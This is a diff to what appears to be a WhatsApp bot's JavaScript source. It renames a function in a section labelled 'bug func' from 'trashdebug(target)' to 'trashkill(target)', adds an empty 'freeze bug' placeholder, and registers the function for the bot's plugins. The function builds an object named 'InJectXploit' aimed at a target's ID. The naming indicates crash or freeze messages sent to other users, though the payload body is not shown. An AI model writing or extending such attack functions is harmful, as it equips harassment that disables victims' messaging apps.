@@ -149,7 +149,7 @@ reply(`bot is always online ✅`)
 }	
 ///////////example///////////////////////////
 ////////bug func/////////////////////
-    async function trashdebug(target) {
+    async function trashkill(target) {
 let InJectXploit = JSON.stringify({
 status: true,
 criador: "TheXtordcv",
@@ -232,6 +232,10 @@ jid: target
 },
 });
 }  
+//////////freeze bug/////////////////
+    
+                
+ 
     
 ///////////end bug func///////////
 const example = (teks) => {
@@ -261,7 +265,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true
 const plugins = await pluginsLoader(path.resolve(__dirname, "trashplugs"))
-const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,sleep,fkontak,menu,addPremiumUser, delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins}
+const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,sleep,fkontak,menu,addPremiumUser, delPremiumUser,isPremium,trashpic,sleep,isAdmins,groupAdmins,trashkill,downloadContentFromMessage}
 for (let plugin of plugins) {
 if (plugin.command.find(e => e == command.toLowerCase())) {
 pluginsDisable = false
